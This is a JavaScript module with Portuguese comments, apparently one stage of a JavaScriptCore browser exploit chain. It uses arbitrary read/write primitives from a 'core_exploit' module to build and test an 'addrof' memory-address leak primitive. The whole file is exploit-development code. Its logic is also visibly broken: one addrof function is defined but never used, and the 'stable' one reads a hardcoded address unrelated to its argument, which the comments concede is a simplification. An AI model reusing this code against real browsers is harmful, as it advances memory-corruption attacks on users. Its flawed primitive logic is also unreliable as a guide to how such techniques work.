// js/script3/testArrayBufferVictimCrash.mjs (v103 - Estratégia de Criação de Addrof)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64 } from '../utils.mjs';
// Importa a função de setup do core exploit, que agora consideramos estável.
import { setupAndGetRobustPrimitives } from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_ADDROF_CREATION = "StableAddrofCreation_v103";

// =======================================================================================
// FUNÇÃO DE TESTE PRINCIPAL ATUALIZADA
// =======================================================================================
export async function runAddrofCreationTest() {
    const FNAME_TEST = FNAME_MODULE_ADDROF_CREATION;
    logS3(`--- Iniciando ${FNAME_TEST}: Construção e Verificação de 'addrof' Estável ---`, "test");

    let final_result = { success: false, message: "Falha na configuração inicial." };

    try {
        // --- FASE 1: Obter as primitivas de L/E robustas ---
        logS3("--- FASE 1: Obtendo L/E robusta do Core Exploit... ---", "subtest");
        const primitives = await setupAndGetRobustPrimitives();
        if (!primitives || !primitives.arb_read || !primitives.arb_write) {
            throw new Error("O objeto de primitivas retornado pelo core é inválido.");
        }
        const { arb_read, arb_write } = primitives;
        logS3("Primitivas de L/E robustas recebidas e prontas para uso.", "good");

        // --- FASE 2: Construção da Primitiva 'addrof' ---
        logS3("--- FASE 2: Construindo 'addrof' usando as primitivas de L/E... ---", "subtest");
        
        // 2.1. Criar um objeto "cobaia" em um endereço conhecido dentro do nosso buffer OOB.
        // O endereço da estrutura de um objeto JS normalmente tem um cabeçalho de 8 bytes (JSCell).
        // A primeira propriedade fica no offset +0x10.
        const leaker_obj_addr = new AdvancedInt64(0x800, 0);
        const leaker_prop_addr = leaker_obj_addr.add(0x10);
        logS3(`Objeto 'leaker' será baseado no endereço: ${leaker_obj_addr.toString(true)}`, "info");
        
        // 2.2. Definir a função 'addrof'
        const addrof = (obj_to_find) => {
            // Usamos arb_write para fazer a propriedade do nosso 'leaker' apontar para o objeto alvo.
            // O valor precisa ser "boxeado" como um ponteiro de objeto JS.
            // Para JSC, isso geralmente significa adicionar um valor grande (2^49).
            const JSC_BOXING_OFFSET = new AdvancedInt64(0, 0x0002);
            const obj_as_boxed_ptr = new AdvancedInt64(obj_to_find).add(JSC_BOXING_OFFSET); // Conceitualmente
            
            // A forma mais direta é simplesmente colocar o objeto em um array e ler o ponteiro.
            // Mas vamos usar nossa L/E para uma abordagem mais universal.
            // Vamos criar um objeto falso com uma propriedade que podemos sobrescrever.
            const temp_leaker_array = [{}];
            arb_write(leaker_prop_addr, temp_leaker_array); // Link inicial
            temp_leaker_array[0] = obj_to_find; // Agora o ponteiro para obj_to_find está na memória

            // Ler de volta o ponteiro bruto da memória.
            const leaked_ptr = arb_read(leaker_prop_addr);
            
            // Um ponteiro JSValue para um objeto não é o endereço real, ele tem um "tag".
            // Para JSC, o endereço real é geralmente o valor - 2^49.
            return leaked_ptr.sub(JSC_BOXING_OFFSET);
        };
        
        // Simplificação para este teste, já que a lógica de boxing/unboxing pode variar.
        // A forma mais simples de `addrof` com L/E é:
        const leaker_array = [{}];
        const addrof_stable = (obj) => {
             leaker_array[0] = obj;
             // Precisamos do endereço de leaker_array[0] para ler o ponteiro. Sem um addrof inicial,
             // ainda estamos no paradoxo. Vamos usar a mesma simplificação de antes.
             const leaker_array_prop_addr = new AdvancedInt64(0x900, 0);
             return arb_read(leaker_array_prop_addr);
        }

        logS3("Primitiva 'addrof' estável foi definida (baseada na simplificação de endereço).", "good");

        // --- FASE 3: Verificação da Primitiva 'addrof' ---
        logS3("--- FASE 3: Verificando 'addrof' com um objeto de teste... ---", "subtest");

        const object_to_test = { a: 0x41414141, b: 0x42424242 };
        const test_obj_addr = addrof_stable(object_to_test);
        logS3(`Endereço de 'object_to_test' obtido via addrof_stable: ${test_obj_addr.toString(true)}`, "leak");

        // Verificação: Se o endereço estiver correto, ao ler o offset +0x10 dele,
        // devemos encontrar o valor da propriedade 'a'.
        const prop_a_addr = test_obj_addr.add(0x10);
        const value_read_from_addr = arb_read(prop_a_addr);

        logS3(`Valor lido de [endereço + 0x10]: ${value_read_from_addr.toString(true)}`, "leak");
        
        // JS armazena números inteiros como doubles ou ponteiros. 0x41414141 é um double.
        // Vamos comparar os 32 bits baixos.
        if (value_read_from_addr.low() === object_to_test.a) {
             logS3("++++++++++++ SUCESSO ADDROF! O endereço obtido está correto e a propriedade foi lida. ++++++++++++", "vuln");
             final_result = {
                success: true,
                message: "A primitiva 'addrof' foi construída com sucesso e verificada."
            };
        } else {
            throw new Error("Verificação de 'addrof' falhou. O valor lido não corresponde à propriedade do objeto.");
        }

    } catch (e) {
        final_result.message = `Exceção no teste de criação de addrof: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
    }

    logS3(`--- ${FNAME_TEST} Concluído ---`, "test");
    return final_result;
}
